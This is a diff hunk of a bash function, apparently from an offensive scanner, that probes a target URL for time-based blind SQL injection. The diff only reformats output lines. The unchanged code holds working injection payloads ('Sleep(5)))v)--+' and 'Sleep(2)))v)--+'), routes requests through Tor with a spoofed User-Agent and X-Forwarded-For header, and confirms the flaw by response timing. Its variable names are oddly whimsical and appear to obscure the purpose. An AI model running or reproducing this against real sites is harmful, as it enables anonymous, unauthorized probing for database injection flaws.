@@ -15,20 +15,20 @@ time_audit_engine() {
     echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$extra_spicy_sauce"
     local secret_msg_powder="${extra_spicy_sauce}Sleep(5)))v)--+"
     local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 12 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$secret_msg_powder")
-    echo -e "    -> Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
+    echo -e "[i] Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
     if (( $(echo "$stopwatch_seconds > 5.0" | bc -l) )); then
         local warm_rice_bowl="${extra_spicy_sauce}Sleep(2)))v)--+"
         local wash_hands_now=$(curl --socks5-hostname 127.0.0.1:9050 -m 8 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$warm_rice_bowl")
         if (( $(echo "$wash_hands_now > 2.0" | bc -l) )) && (( $(echo "$wash_hands_now < 4.0" | bc -l) )); then
-            echo -e "    -> Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
-            echo -e "    \e[0;31m[!+!] ALERT: 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
+            echo -e "[i] Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
+            echo -e "\e[0;31m[!+!] ALERT: 'Confirmed' Genuine Time Based Vulnerability!\e[0m"
         else
-            echo -e "    -> Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
-            echo -e "    \e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
+            echo -e "[i] Time-Delay Matrix: First Check (${stopwatch_seconds}s) | Second Check (${wash_hands_now}s)"
+            echo -e "\e[0;33m[-] Status: False postive, neither network lag or server defense mechanism detected.\e[0m"
         fi
     else
-        echo -e "    -> Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
-        echo -e "    \e[0;37m[-] Status: Safe, normal server response time.\e[0m"
+        echo -e "[i]Total Response Time: \e[0;32m${stopwatch_seconds}s\e[0m"
+        echo -e "\e[0;37m[-] Status: Safe, normal server response time.\e[0m"
     fi
     echo ""
 }
